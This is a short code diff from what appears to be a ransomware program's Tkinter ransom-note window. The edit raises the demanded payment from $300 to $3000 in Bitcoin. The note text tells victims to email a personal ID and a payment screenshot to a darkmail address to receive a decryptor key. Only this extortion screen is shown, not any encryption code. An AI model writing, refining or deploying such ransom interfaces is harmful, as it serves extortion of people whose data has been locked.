@@ -42,7 +42,7 @@ payment_title.pack(side="top", pady=(10, 0))
 
 steps_label = tk.Label(
     window,
-    text="1. Payment is accepted in Bitcoin (BTC) only. You must send the equivalent of $300 USD to the wallet address provided below.\n\n"
+    text="1. Payment is accepted in Bitcoin (BTC) only. You must send the equivalent of $3000 USD to the wallet address provided below.\n\n"
          "2. Send your Personal ID and a screenshot of the transaction to the following email: fazbear_recovery@darkmail.xyz\n\n"
          "3. Once the payment is confirmed, you will receive your unique decryptor key.",
     fg="red",
